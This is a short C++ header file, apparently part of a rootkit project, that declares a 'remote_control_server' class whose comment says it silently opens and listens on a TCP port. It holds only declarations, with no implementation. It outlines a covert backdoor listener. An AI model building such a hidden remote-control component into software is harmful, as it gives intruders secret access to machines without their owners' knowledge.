#ifndef ROOTKIT_REMOTE_CONTROL_SERVER_H
#define ROOTKIT_REMOTE_CONTROL_SERVER_H

#include "../../basic/network/tcp_port.h"

// silently opens a tcp port and listens on it
class remote_control_server {
    TCP_PORT my_port;

public:
    explicit remote_control_server(TCP_PORT myPort) : my_port(myPort) {}

    void run();

    void stop();
};


#endif //ROOTKIT_REMOTE_CONTROL_SERVER_H
